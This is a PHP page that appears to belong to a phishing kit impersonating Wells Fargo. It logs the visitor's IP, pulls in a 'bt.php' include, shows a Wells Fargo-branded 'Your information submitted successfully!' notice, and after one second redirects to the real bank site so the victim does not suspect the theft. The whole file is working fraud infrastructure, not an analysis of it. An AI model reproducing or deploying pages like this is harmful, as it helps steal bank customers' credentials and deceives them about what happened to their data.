<?php
session_start();
include ('bt.php');
$ib = getenv("REMOTE_ADDR");
$random=rand(0,100000000000);
$ran = md5($random);
$_SESSION[$ran] = $random;
$random=rand(0,100000000000);
$rans = md5($random);
$_SESSION[$rans] = $random;
$ip = getenv("REMOTE_ADDR");

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>


<HEAD>
   <meta http-equiv="Content-type" content="text/html; charset=ISO-8859-1" />   
   
   <META HTTP-EQUIV="Refresh" CONTENT="1;URL=https://www.wellsfargo.com" >
<link href="./imgs/favicon.ico" rel="icon" type="image/x-icon" />

   

   
   
      
      
   


<TITLE>Authenticating Account Information </TITLE>


   <link rel="stylesheet" type="text/css" href="../common/styles/wibscreen.css" />

</HEAD>               

<BODY BGCOLOR="#ffffff">
  
    
  






<!-- ********************************* Begin Body ************************** -->
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<div id="pause" align="center">
<table width="340" border="0" cellpadding="0" cellspacing="0">
  <tr>
    <td width="72" height="72">
      <img src="./imgs/wells.png" height="72" width="72" align="left" hspace="0" alt="Wells Fargo">
    </td>
    <td>
      <img src="./imgs/wells.png" height="1" width="3" border="0" alt="">
    </td>
    <td>
      <table width="265" height="72" border="1" cellpadding="5" cellspacing="0">
        <tr>
          <td width="230" valign="bottom" align="left">
            <span class="pausemsg">Your information submitted successfully!...</span>
          </td>
        </tr>
      </table>
    </td>
  </tr>

  

</table>
</div>


</BODY>
</html>
